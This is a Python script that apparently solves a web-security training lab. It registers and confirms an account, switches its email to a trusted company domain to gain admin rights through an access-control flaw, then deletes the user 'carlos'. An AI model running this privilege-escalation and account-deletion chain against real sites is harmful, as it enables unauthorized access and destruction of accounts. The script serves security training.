import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# get csrf token
def get_csrf_token(s, url):
    r = s.get(url + "/login", verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})
    token = csrf["value"]
    return token 

# find email client link
def get_email_client(s, url):
    r = s.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    email = soup.find('a', attrs={'id': 'exploit-link'})['href']
    print(f"[+] The email client address is: {email}")
    return email    

# register an account
def register(s, url):
    print("[*] Registering the account test:test...")
    register_page = url + "/register"
    csrf = get_csrf_token(s, url)
    email_url = get_email_client(s, url)

    domain = email_url.split("//")[1].split("/")[0]
    email = f"test@{domain}"                          
    
    print(f"[*] Registering with email: {email}")
    data = {"csrf": csrf, "username": "test", "email": email, "password": "test"}
    r = s.post(register_page, data=data, verify=False, allow_redirects=True)
    if "Please check your emails" in r.text:
        return email_url
    return None 

# follow confirmation link
def get_link(s, email_url):
    print("[*] Grabbing confirmation link...")
    r = s.get(email_url, verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    link = soup.find("a", href=re.compile("temp-registration"))
    return link["href"]

# login
def login(s, url):
    login_page = url + "/login"
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": "test", "password": "test"}
    r = s.post(login_page, data=data, verify=False, allow_redirects=True)
    if "Log out" in r.text:
        return True
    return False

# change email
def change_email(s, url):
    print("[*] Changing email to: test@dontwannacry.com")
    change_link = url + "/my-account/change-email"
    csrf = get_csrf_token(s, url)
    data = {"email": "test@dontwannacry.com", "csrf": csrf}
    r = s.post(change_link, data=data, verify=False)
    if "Your email is: test@dontwannacry.com" in r.text:
        return True
    return False   

# delete carlos
def delete_carlos(s, url):
    print("[*] Deleting user Carlos from admin panel...")
    delete = url + "/admin/delete?username=carlos"
    r = s.get(delete, verify=False)
    if "Congratulations" in r.text:
        print("[+] Lab solved")
    else:
        print("[-] Error deleting user Carlos")

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    email_url = register(s, url)
    if not email_url:
        print("[-] Registration failed")
        return

    confirmation_link = get_link(s, email_url)
    print(f"[+] Confirmation link: {confirmation_link}")
    s.get(confirmation_link, verify=False)

    if not login(s, url):
        print("[-] Login failed")
        return
    print("[+] Login successful")

    change_email(s, url)
    delete_carlos(s, url)

if __name__ == "__main__":
    main()